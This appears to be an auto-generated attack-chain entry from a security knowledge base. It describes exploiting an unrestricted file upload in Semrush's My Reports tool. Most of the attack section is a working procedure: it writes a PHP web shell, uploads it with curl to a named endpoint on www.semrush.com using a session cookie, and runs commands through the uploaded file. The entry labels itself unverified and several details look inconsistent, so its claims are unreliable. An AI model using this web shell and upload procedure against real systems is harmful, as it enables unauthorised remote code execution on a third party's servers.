---
tags:
  - unrestricted-file-upload
  - web-vulnerability
  - rce
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Unrestricted-File-Upload-in-Semrush-My-Reports]]'
step_count: 1
techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:13.782Z'
description: >-
  A multi-stage attack exploiting an unrestricted file upload vulnerability in
  the Semrush My Reports tool, allowing upload of malicious files without
  validation, potentially leading to remote code execution or server compromise.
skill_level: intermediate
impact_level: medium
id: 400e63cc-d4f1-437e-b8a1-0df75a095f83
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Exploit Public-Facing Application]]'
---
# Unrestricted File Upload in Semrush My Reports Leading to Potential Server-Side Compromise

Multi-stage attack chain demonstrating exploitation of an unrestricted file upload vulnerability in the Semrush platform's My Reports tool, enabling attackers to upload malicious files without type or content validation, potentially resulting in server-side execution or data compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Authentication] --> B[Upload Malicious File]
    B --> C[Access Uploaded File for Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform (Semrush application at www.semrush.com)
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to the target endpoint

### Initial Access Requirements

- Valid user credentials for Semrush account (authentication required for My Reports tool)
- Network position: External attacker with authenticated session
- Prior access needed: Logged-in session cookie or API token

## Detailed Attack Procedures

### Step 1: Exploit File Upload Vulnerability
procedure: [[procedures/Exploit-Unrestricted-File-Upload-in-Semrush-My-Reports]]

**Objective**: Upload a malicious file to the vulnerable endpoint without restrictions, potentially enabling server-side code execution or compromise.

**Instructions**: Authenticate to the Semrush platform to obtain a session cookie. Then, craft a simple malicious PHP web shell (e.g., a file named shell.php containing <?php system($_GET['cmd']); ?>) and upload it using a POST request to the /my_reports/api/v1/upload/image endpoint, bypassing any intended image-only restrictions due to lack of validation.

First, prepare the malicious file:

```bash
# Create a simple PHP shell file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Use [[commands/curl-upload-malicious-file]] to perform the upload:

```bash
curl -X POST -H "Cookie: session=your_session_cookie" -F "file=@shell.php" https://www.semrush.com/my_reports/api/v1/upload/image
```

After upload, note the response which may include the uploaded file path or URL. Access the uploaded file via a browser or curl to execute commands, e.g., https://www.semrush.com/uploads/shell.php?cmd=whoami.

**Expected Output**: Successful upload response (e.g., JSON with file details) and ability to execute commands on the server upon accessing the file.

**Success Indicators**:
- HTTP 200 or success status from upload request
- Uploaded file accessible and executable on the server
- Command output visible when accessing the shell (e.g., system info from whoami)

## Attack Chain Summary

### Key Achievements

1. Bypassed file upload restrictions to place malicious code on the server
2. Achieved potential remote code execution via the uploaded file
3. Demonstrated medium-impact compromise of the Semrush web application

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Remote File Copy]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
